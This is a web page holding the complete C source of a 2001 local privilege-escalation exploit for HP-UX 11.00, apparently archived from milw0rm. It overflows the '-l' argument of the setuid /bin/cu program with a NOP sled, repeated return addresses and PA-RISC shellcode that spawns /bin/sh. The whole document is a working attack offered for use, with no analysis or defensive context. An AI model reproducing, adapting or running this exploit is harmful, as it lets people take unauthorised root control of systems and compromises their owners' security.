<html><head><title>HP-UX 11.0 /bin/cu Privilege Escalation Exploit</title></head><pre>/*
 * Copyright (c) 2001 Zorgon                              
 * All Rights Reserved                                    
 * The copyright notice above does not evidence any       
 * actual or intended publication of such source code.    
 * 
 * HP-UX /bin/cu exploit.
 * Tested on HP-UX 11.00 
 * zorgon@antionline.org (http://www.nightbird.free.fr) 
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

#define LEN 9778 
#define HPPA_NOP 0x0b390280
#define RET 0x7f7eb010
#define OFFSET 1200    /* it works for me */

u_char hppa_shellcode[] = /* K2 &lt;ktwo@ktwo.ca&gt; shellcode */
&quot;\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40&quot;
&quot;\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe&quot;
&quot;\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff&quot;;

int 
main(int argc , char **argv){
  char buffer[LEN+8];
  int i;
  long retaddr = RET;
  int offset = OFFSET;
 
  if(argc&gt;1) offset = atoi(argv[1]);
    for (i=0;i&lt;LEN;i+=4)
      *(long *)&amp;buffer[i] = retaddr + offset; 

  for (i=0;i&lt;(LEN-strlen(hppa_shellcode)-50);i++) 
    *(buffer+i) = HPPA_NOP;

  memcpy(buffer+i,hppa_shellcode,strlen(hppa_shellcode));
  fprintf(stderr, &quot;HP-UX 11.00 /bin/cu exploit\n&quot;);
  fprintf(stderr, &quot;Copyright (c) 2001 Zorgon\n&quot;);                              
  fprintf(stderr, &quot;[return address = %x] [offset = %d] [buffer size = %d]\n&quot;, retaddr + offset, offset, strlen(buffer));

  execl(&quot;/bin/cu&quot;,&quot;cu&quot;,&quot;-l&quot;,buffer,0);
}


// milw0rm.com [2001-01-13]</pre></html>